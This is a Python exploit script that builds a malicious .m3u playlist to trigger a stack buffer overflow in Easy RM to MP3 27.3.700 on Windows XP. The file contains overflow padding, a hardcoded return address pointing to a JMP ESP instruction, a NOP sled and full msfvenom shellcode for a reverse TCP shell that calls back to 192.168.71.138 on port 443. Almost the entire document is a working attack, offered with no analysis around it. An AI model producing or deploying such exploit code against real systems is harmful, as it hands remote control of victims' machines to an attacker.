#
# Exploit for Easy RM to MP3 27.3.700 vulnerability, discovered by Crazy_Hacker
# Written by Saulo (hycodex) Hachem
# shellterlabs.com
#
# Tested on Windows XP SP3 (En)
#
# Thanks corelanc0d3r :-)

print("Generating Exploit")

f = open('exploit.m3u', 'w')

offset = "A"*26056
junk = "C"*3631
nops = "\x90"*100
EIP = "\x58\xb0\x01\x10" # !mona jmp -r esp -o

# msfvenom --payload windows/shell/reverse_tcp LPORT=443 LHOST=192.168.71.138 --format python -b '\x00\xff\x0a'
# Arch: x86 from the payload
# Payload size: 360 bytes
# Final size of python file: 1730 bytes

buf =  ""
buf += "\xb8\x96\xf8\x7b\x6f\xda\xcb\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x54\x83\xeb\xfc\x31\x43\x0f\x03\x43\x99\x1a"
buf += "\x8e\x93\x4d\x58\x71\x6c\x8d\x3d\xfb\x89\xbc\x7d\x9f"
buf += "\xda\xee\x4d\xeb\x8f\x02\x25\xb9\x3b\x91\x4b\x16\x4b"
buf += "\x12\xe1\x40\x62\xa3\x5a\xb0\xe5\x27\xa1\xe5\xc5\x16"
buf += "\x6a\xf8\x04\x5f\x97\xf1\x55\x08\xd3\xa4\x49\x3d\xa9"
buf += "\x74\xe1\x0d\x3f\xfd\x16\xc5\x3e\x2c\x89\x5e\x19\xee"
buf += "\x2b\xb3\x11\xa7\x33\xd0\x1c\x71\xcf\x22\xea\x80\x19"
buf += "\x7b\x13\x2e\x64\xb4\xe6\x2e\xa0\x72\x19\x45\xd8\x81"
buf += "\xa4\x5e\x1f\xf8\x72\xea\x84\x5a\xf0\x4c\x61\x5b\xd5"
buf += "\x0b\xe2\x57\x92\x58\xac\x7b\x25\x8c\xc6\x87\xae\x33"
buf += "\x09\x0e\xf4\x17\x8d\x4b\xae\x36\x94\x31\x01\x46\xc6"
buf += "\x9a\xfe\xe2\x8c\x36\xea\x9e\xce\x5e\xdf\x92\xf0\x9e"
buf += "\x77\xa4\x83\xac\xd8\x1e\x0c\x9c\x91\xb8\xcb\xe3\x8b"
buf += "\x7d\x43\x1a\x34\x7e\x4d\xd8\x60\x2e\xe5\xc9\x08\xa5"
buf += "\xf5\xf6\xdc\x50\xf3\x60\x1f\x0c\xbc\xfa\xf7\x4f\x43"
buf += "\xfb\xbc\xd9\xa5\xab\x92\x89\x79\x0b\x43\x6a\x2a\xe3"
buf += "\x89\x65\x15\x13\xb2\xaf\x3e\xb9\x5d\x06\x16\x55\xc7"
buf += "\x03\xec\xc4\x08\x9e\x88\xc6\x83\x2b\x6c\x88\x63\x59"
buf += "\x7e\xfc\x15\xa1\x7e\xfc\xbf\xa1\x14\xf8\x69\xf5\x80"
buf += "\x02\x4f\x31\x0f\xfd\xba\x41\x48\x01\x3b\x70\x22\x37"
buf += "\xa9\x3c\x5c\x37\x3d\xbd\x9c\x61\x57\xbd\xf4\xd5\x03"
buf += "\xee\xe1\x1a\x9e\x82\xb9\x8e\x21\xf3\x6e\x19\x4a\xf9"
buf += "\x49\x6d\xd5\x02\xbc\xee\x12\xfc\x42\xd2\xba\x95\xbc"
buf += "\x52\x3b\x66\xd7\x52\x6b\x0e\x2c\x7d\x84\xfe\xcd\x54"
buf += "\xcd\x96\x44\x38\xbf\x07\x58\x11\x61\x96\x59\x95\xba"
buf += "\xcf\xd7\x5a\x3d\xf0\x19\x67\xeb\xc9\x6f\xa0\x2f\x6e"
buf += "\x7f\x9b\x12\xc7\xea\xe3\x01\x17\x3f"


f.write(offset + EIP + nops + buf + junk)

f.close

print("File Created Successfuly")
